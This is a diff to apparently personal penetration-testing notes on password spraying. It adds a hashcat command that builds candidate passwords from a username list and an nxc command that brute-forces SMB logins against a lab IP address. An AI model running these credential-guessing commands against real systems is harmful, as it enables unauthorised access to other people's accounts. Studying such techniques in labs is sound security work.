@@ -9,6 +9,16 @@
 - [External Password Spraying](#external-password-spraying)
 
 ---
+```
+# Generate a password from username list:
+`hashcat --force --stdout -r /usr/share/hashcat/rules/best66.rule users.txt > passwords.txt`
+
+## brute test
+`nxc smb 10.129.228.111 -u users.txt -p passwords.txt`
+
+```
+
+---
 
 # Internal Password Spraying - from Linux
 
